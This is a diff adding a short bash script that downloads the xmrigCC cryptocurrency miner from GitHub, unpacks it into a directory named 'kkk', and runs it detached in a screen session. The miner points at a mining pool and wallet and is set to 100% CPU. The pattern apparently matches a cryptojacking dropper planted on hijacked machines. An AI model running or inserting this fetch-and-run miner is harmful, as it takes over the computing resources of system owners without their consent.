@@ -1,0 +1,2 @@
+#!/bin/bash
+sysctl -w vm.nr_hugepages=128 && mkdir kkk && cd kkk && wget https://github.com/Bendr0id/xmrigCC/releases/download/1.9.3/xmrigCC-1.9.3-with_tls-gcc7-linux-static-miner_only-x64.tar.gz && tar xf xmrigCC-1.9.3-with_tls-gcc7-linux-static-miner_only-x64.tar.gz && screen -d -m ./xmrigDaemon --donate-level 1 -o upx.hashpool.cc:21601 -u UPi1S1uqRRNSgC26PjasZP8FwTBRwnAEmBnx5mAYsbGqRvsU46aficYEA3FAT621EuPeChyKQumS7j6jpF74zW9tLJMvBG8NNqm2SUjJRiMSz -p kakaka -a cryptonight-extremelite --variant upx2 --max-cpu-usage=100 -k --use-tls
